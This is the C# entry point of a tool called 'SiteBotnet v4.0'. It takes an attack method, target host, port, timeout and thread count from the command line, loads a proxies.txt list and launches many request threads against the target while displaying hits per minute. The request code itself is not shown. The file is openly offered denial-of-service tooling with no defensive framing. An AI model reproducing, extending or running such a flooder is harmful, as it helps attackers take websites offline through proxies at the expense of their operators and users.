using System;
using System.IO;
using System.Threading.Tasks;
using System.Threading;
using System.Timers;

namespace SiteBotnet
{
    class Program
    {
        static void Main(string[] args)
        {
            Reference.Method = args[0].ToUpper();
            Reference.Target = args[1];
            Reference.Port = int.Parse(args[2]);
            Reference.Timeout = int.Parse(args[3]);
            Reference.Threads = int.Parse(args[4]);
            Reference.ProxyType = args[5].ToUpper();
            Reference.Proxies = File.ReadAllLines("proxies.txt");

            InitCPM();
            Thread.Sleep(2000);

            Task.Run(() =>
            {
                while (true)
                {
                    Reference.HPM = Reference.Hits * 60 / Reference.Clock;
                    Console.Title = "SiteBotnet v4.0 - " + Reference.Threads + " Threads - " + Reference.HPM + " HPM";
                    Thread.Sleep(1000);
                }
            });

            for (int i = 1; i < Reference.Threads; i++)
                new Request("Thread-" + i).Start();
        }

        private static void AddTime(object sender, ElapsedEventArgs e)
        {
            Reference.Clock++;
        }

        public static void InitCPM()
        {
            System.Timers.Timer timer = new System.Timers.Timer
            {
                Interval = 1000
            };

            timer.Elapsed += AddTime;
            timer.Start();
        }
    }
}
